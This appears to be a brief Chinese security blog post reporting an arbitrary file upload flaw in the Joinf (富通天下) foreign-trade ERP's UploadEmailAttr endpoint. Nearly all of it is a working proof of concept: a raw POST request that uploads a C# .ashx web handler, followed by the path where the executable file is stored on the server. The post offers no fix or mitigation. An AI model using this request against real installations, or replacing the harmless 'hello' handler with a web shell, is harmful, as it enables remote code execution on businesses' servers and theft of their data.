#  富通天下外贸ERPUploadEmailAttr存在任意文件上传漏洞   
原创 骇客安全  骇客安全   2025-02-10 16:00  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991MG7ibSbMGgCWwaPJHEIUoDNq0X8vjMaOg7GC4tpCapE23ib9Y8bKpcWibRLZHJ2TKeFE3xjOXuNDXjw/640?wx_fmt=png&from=appmsg "null")  
# 四、漏洞复现  
```
POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: application/x-www-form-urlencoded

<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
{
public bool IsReusable
{ get { return true; } }
public void ProcessRequest(HttpContext ctx)
{
ctx.Response.Write("hello");
}
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991MG7ibSbMGgCWwaPJHEIUoDNBgNHJ3BVksuxcEuOSFm3Mq8KdsicBr2Z1Q0jgjNXbdcDZkSWNZicgnjg/640?wx_fmt=png&from=appmsg "null")  
  
文件上传位置  
```
/JoinfWebFile/temp/emailatta/202404/20240417D636C4D1F279410CB324E1AFFE28B141.ashx
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991MG7ibSbMGgCWwaPJHEIUoDNH9oO2fMCpfJOyuic7GkjiciaLCILiaiaibJsqV5nrRJwAWAiaPRVTxqZO634g/640?wx_fmt=png&from=appmsg "null")  
  
  
